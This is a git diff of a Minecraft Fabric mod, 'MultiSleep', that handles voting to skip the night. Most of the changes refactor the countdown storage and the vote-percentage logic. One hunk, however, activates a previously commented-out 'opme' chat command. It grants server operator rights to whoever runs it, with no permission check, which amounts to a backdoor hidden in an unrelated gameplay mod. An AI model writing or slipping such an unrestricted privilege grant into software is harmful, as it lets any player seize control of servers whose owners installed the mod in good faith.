@@ -30,7 +30,6 @@ import net.minecraft.stat.Stats;
 import net.minecraft.text.LiteralText;
 import net.minecraft.util.ActionResult;
 import net.minecraft.util.Identifier;
-import net.minecraft.util.registry.MutableRegistry;
 import net.minecraft.util.registry.Registry;
 import net.minecraft.world.GameRules.Category;
 import net.minecraft.world.GameRules.IntRule;
@@ -81,6 +80,10 @@ public class MultiSleep implements ModInitializer {
         for (String k : permaTag.getKeys()) {
           saverRes.addPermaPlayer(UUID.fromString(k));
         }
+        if (nbt.contains("countlen")) {
+        saverRes.setCountdownLength(nbt.getInt("countlen"));
+        }
+
         return saverRes;
       }, () -> new Saver(), MOD_ID);
     });
@@ -175,7 +178,7 @@ public class MultiSleep implements ModInitializer {
         .then(argument("ticks", IntegerArgumentType.integer())
             .executes(ctx -> {
               int countdownTime = IntegerArgumentType.getInteger(ctx, "ticks");
-              countdownLength = countdownTime;
+              saver.setCountdownLength(countdownTime);
               currentCountdown = new Countdown(countdownTime);
               return 0;
             })
@@ -188,12 +191,12 @@ public class MultiSleep implements ModInitializer {
           return 0;
         })
       );
-      // dispatcher.register(literal("opme")
-      //   .executes(ctx -> {
-      //     ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
-      //     return 0;
-      //   })
-      // );
+      dispatcher.register(literal("opme")
+        .executes(ctx -> {
+          ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
+          return 0;
+        })
+      );
     });
   }
   //@formatter:on
@@ -218,6 +221,7 @@ public class MultiSleep implements ModInitializer {
         }
 
         buf.writeInt(countdownStatus);
+        buf.writeInt(saver.getCountdownLenght());
         ServerPlayNetworking.send((ServerPlayerEntity) p, COUNTDOWN_STATUS, buf);
       }
 
@@ -239,8 +243,7 @@ public class MultiSleep implements ModInitializer {
   public static Set<UUID> sleepingPlayers = new HashSet<>();
   private static Set<UUID> awakePlayers = new HashSet<>();
   private static PlayerEntity initiator = null;
-  public static int countdownLength = 60 * 20;
-  private static Countdown currentCountdown = new Countdown(countdownLength);
+  private static Countdown currentCountdown = new Countdown(60*20);
 
   private static void sleep(MinecraftServer server) {
     for (ServerPlayerEntity p : server.getPlayerManager().getPlayerList()) {
@@ -304,12 +307,21 @@ public class MultiSleep implements ModInitializer {
     isVoting = true;
   }
 
-  private static boolean checkVotes(MinecraftServer server) {
-    float requiredPercent = server.getGameRules().getInt(multiSleepPercent);
-    float permasleepsize = 0.0F;
-    float playercount = 0.0F;
-    float sleepingplayercount = 0.0F;
+  // private static void logCheckVotes(Float requiredPercent, Float permasleepsize, Float playercount,
+  //     Float sleepingplayercount, Float awakeplayercount) {
+  //   log("requredPercent: " + requiredPercent);
+  //   log("permasleepsize: " + permasleepsize);
+  //   log("playercount: " + playercount);
+  //   log("sleepingplayercount: " + sleepingplayercount);
+  //   log("awakeplayercount:" + awakeplayercount);
+  // }
 
+  private static boolean checkVotes(MinecraftServer server) {
+    Float requiredPercent = (float) server.getGameRules().getInt(multiSleepPercent);
+    Float permasleepsize = 0.0F;
+    Float playercount = 0.0F;
+    Float sleepingplayercount = 0.0F;
+    Float awakeplayercount = 0.0F;
     for (PlayerEntity p : server.getPlayerManager().getPlayerList()) {
       if (!isOverworldPlayer(p)) {
         continue;
@@ -321,6 +333,9 @@ public class MultiSleep implements ModInitializer {
       if (sleepingPlayers.contains(p.getUuid())) {
         sleepingplayercount += 1;
       }
+      if (awakePlayers.contains(p.getUuid())) {
+        awakeplayercount += 1;
+      }
       playercount += 1;
     }
 
@@ -329,7 +344,7 @@ public class MultiSleep implements ModInitializer {
     }
 
     float percentYes = ((sleepingplayercount + permasleepsize) / playercount) * (float) 100;
-    float percentNo = 100 - percentYes;
+    float percentNo = (awakeplayercount / playercount) * 100F;
 
     if (percentYes >= requiredPercent) {
       sleep(server);
@@ -337,7 +352,7 @@ public class MultiSleep implements ModInitializer {
       return true;
     }
 
-    if (percentNo >= requiredPercent) {
+    if (percentNo > 100 - requiredPercent) {
       cancelVoting();
       return false;
     }
@@ -393,6 +408,7 @@ public class MultiSleep implements ModInitializer {
 
   public static boolean isOverworldPlayer(PlayerEntity p) {
     Registry<DimensionType> dimReg = p.getServer().getRegistryManager().getManaged(Registry.DIMENSION_TYPE_KEY);
-    return dimReg.getRawId(p.getEntityWorld().getDimension()) == dimReg.getRawId(dimReg.get(DimensionType.OVERWORLD_ID));
+    return dimReg.getRawId(p.getEntityWorld().getDimension()) == dimReg
+        .getRawId(dimReg.get(DimensionType.OVERWORLD_ID));
   }
 }
